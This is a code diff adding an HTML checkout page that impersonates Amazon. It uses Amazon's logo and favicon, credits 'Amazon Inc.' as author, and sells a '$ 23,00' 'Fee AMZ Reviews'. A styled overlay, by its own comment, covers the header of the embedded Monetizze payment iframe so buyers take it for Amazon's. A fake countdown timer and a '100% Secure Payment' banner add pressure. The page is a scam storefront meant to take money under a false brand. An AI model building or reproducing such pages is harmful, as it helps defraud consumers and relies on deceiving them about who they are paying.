@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="shortcut icon" href="https://www.amazon.com/favicon.ico" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Rewards</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+
+
+
+  <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+  <style>
+    body,
+    html {
+      margin: 0;
+      padding: 0;
+      background-color: #eaeded;
+      /* Amazon Light Gray Background */
+      font-family: Arial, sans-serif;
+    }
+
+    .caixa-checkout {
+      max-width: 420px;
+      margin: 0px auto;
+      background-color: white;
+
+      /* Amazon rounded corners */
+      overflow: hidden;
+      border: 1px solid #d5d9d9;
+      /* Amazon border color */
+      position: relative;
+    }
+
+    /* Simulate Amazon Checkout Header styling within the overlay */
+    .sobreposicao-topo {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 90px;
+      /* Covers the Monetizze header */
+      background: linear-gradient(to bottom, #f7f7f7, #ffffff);
+      z-index: 10;
+      display: flex;
+      flex-direction: row;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 0 20px;
+      gap: 10px;
+      text-align: left;
+      pointer-events: none;
+    }
+
+    .sobreposicao-rodape,
+    .sobreposicao-rodape2 {
+      position: absolute;
+      left: 0;
+      right: 0;
+      background-color: #ffffff;
+      z-index: 10;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      pointer-events: none;
+      font-weight: bold;
+      font-size: 13px;
+      color: #555;
+    }
+
+    .sobreposicao-rodape {
+      bottom: 0%;
+      height: 40px;
+      border-top: 1px solid #eee;
+    }
+
+    .sobreposicao-rodape2 {
+      bottom: 8%;
+      height: 30px;
+    }
+
+    .sobreposicao-topo img {
+      height: 40px;
+      /* Adjusted to be more subtle like Amazon header logo */
+      margin-bottom: 0;
+    }
+
+    .nome-produto {
+      font-size: 18px;
+      font-weight: 700;
+      color: #0F1111;
+      /* Amazon Black */
+      line-height: 1.2;
+      margin-top: 10px;
+    }
+
+    .autor {
+      font-size: 13px;
+      color: #565959;
+      /* Amazon Dark Gray */
+      margin-top: 2px;
+    }
+
+    .preco {
+      font-size: 22px;
+      color: #21a506;
+      /* Amazon Price Red */
+      font-weight: 700;
+      margin-top: 2px;
+    }
+
+    iframe {
+      margin-top: 20px;
+      width: 100%;
+      height: 1700px;
+      border: none;
+      position: relative;
+      z-index: 1;
+    }
+  </style>
+</head>
+<!-- Contador de tempo -->
+<div class="contador">
+  <div class="tempo" id="tempo">00:00:00</div>
+  <i class="fa-solid fa-stopwatch"></i>
+  <div class="mensagem">Offer available for a limited time!</div>
+</div>
+
+
+<!-- Estilo do contador -->
+<style>
+  /* ===== DESKTOP ===== */
+  .contador {
+    background: #ff3b30;
+    color: #fff;
+    font-family: 'Open Sans', sans-serif;
+    font-weight: bold;
+    font-size: 20px;
+    padding: 1px;
+    /* padding igual em todos os lados */
+    display: flex;
+    align-items: center;
+    justify-content: flex-start;
+    gap: 12px;
+    border-radius: 1px;
+    width: 100%;
+    max-width: 560px;
+    /* largura igual ao box branco */
+    margin: 20px auto;
+  }
+
+  .contador .tempo {
+    font-size: 26px;
+    letter-spacing: 2px;
+    white-space: nowrap;
+  }
+
+  .contador i {
+    font-size: 22px;
+    flex-shrink: 0;
+  }
+
+  .contador .mensagem {
+    font-size: 16px;
+    font-weight: normal;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+
+  /* ===== MOBILE ===== */
+  @media (max-width: 640px) {
+    .contador {
+      box-sizing: border-box;
+      width: 100%;
+      max-width: 411px;
+      /* igual ao box branco no mobile */
+      margin: 22px auto;
+      padding: 18px;
+      /* padding igual nos 4 lados */
+      display: grid;
+      grid-template-columns: auto 18px 1fr;
+      align-items: center;
+      column-gap: 10px;
+      border-radius: 1px;
+    }
+
+    .contador .tempo {
+      font-size: 20px;
+      letter-spacing: 1.5px;
+      line-height: 1;
+    }
+
+    .contador i {
+      font-size: 18px;
+    }
+
+    .contador .mensagem {
+      font-size: 14px;
+      white-space: normal;
+      line-height: 1.2;
+      text-align: left;
+    }
+  }
+
+  @media (max-width: 360px) {
+    .contador {
+      padding: 14px;
+      column-gap: 8px;
+    }
+
+    .contador .tempo {
+      font-size: 18px;
+      letter-spacing: 1px;
+    }
+
+    .contador i {
+      font-size: 16px;
+    }
+
+    .contador .mensagem {
+      font-size: 12.5px;
+    }
+  }
+</style>
+
+<!-- Script do contador -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
+<script>
+  let tempoRestante = 900;
+
+  function atualizarContador() {
+    let horas = String(Math.floor(tempoRestante / 3600)).padStart(2, '0');
+    let minutos = String(Math.floor((tempoRestante % 3600) / 60)).padStart(2, '0');
+    let segundos = String(tempoRestante % 60).padStart(2, '0');
+
+    document.getElementById('tempo').textContent = `${horas} : ${minutos} : ${segundos}`;
+
+    if (tempoRestante > 0) {
+      tempoRestante--;
+    } else {
+      clearInterval(intervalo);
+    }
+  }
+
+  atualizarContador();
+  let intervalo = setInterval(atualizarContador, 1000);
+</script>
+
+
+
+
+
+<body>
+
+  <div class="caixa-checkout">
+    <div class="sobreposicao-topo">
+      <img src="assets/amzlogo.png" alt="Logo">
+      <div>
+        <div class="nome-produto">Fee AMZ Reviews</div>
+        <div class="autor">Author: Amazon Inc. ©</div>
+        <div class="preco">$ 23,00</div>
+      </div>
+    </div>
+
+
+
+
+
+    <iframe id="monetizze_iframe" src="https://pay.monetizze.com.br/KSS450366" scrolling="no"></iframe>
+
+    <!-- ===== SCRIPT PARA PASSAR UTM ===== -->
+    <script>
+      (function () {
+        document.addEventListener('DOMContentLoaded', function () {
+          var iframe = document.getElementById('monetizze_iframe');
+          if (!iframe) return;
+
+          var params = window.location.search;
+          if (params) {
+            // Verifica se a URL já tem ? para usar & ou ?
+            var separator = iframe.src.indexOf('?') > -1 ? '&' : '?';
+            // Se params começa com ?, removemos para evitar duplicidade na concatenação se usarmos separator
+            // Mas window.location.search já vem com ?.
+            // Maneira robusta:
+            var currentSrc = iframe.src;
+            var newSrc = currentSrc + (currentSrc.indexOf('?') === -1 ? params : '&' + params.substring(1));
+
+            iframe.src = newSrc;
+          }
+        });
+      })();
+    </script>
+    <!-- ===== FIM SCRIPT UTM ===== -->
+
+
+
+    <div class="sobreposicao-rodape">
+      🔒 100% Secure Payment with Advanced Encryption
+    </div>
+
+  </div>
+
+</body>
+
+</html>
